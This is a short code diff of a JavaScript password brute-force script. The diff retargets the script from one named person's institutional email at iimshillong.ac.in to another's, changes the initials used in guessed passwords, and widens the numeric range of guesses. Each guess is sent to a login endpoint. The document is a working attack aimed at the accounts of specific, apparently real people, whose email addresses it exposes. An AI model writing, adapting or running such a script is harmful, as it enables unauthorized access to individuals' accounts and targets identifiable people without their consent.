@@ -1,11 +1,11 @@
 
 const bruteforce = async () => {
-    const password_initials = "TL"
-    const email = "teidorlang@iimshillong.ac.in"
+    const password_initials = "DM"
+    const email = "debasisha@iimshillong.ac.in"
     let i = 2000 
     // let j = 3000
 
-    for (i; i<=2100; i++){
+    for (i; i<=2200; i++){
         const password = `${i}@${password_initials}`
         const response = await fetch(`http://proxy.nimbushq.xyz/api/login`, {
             method: 'POST',
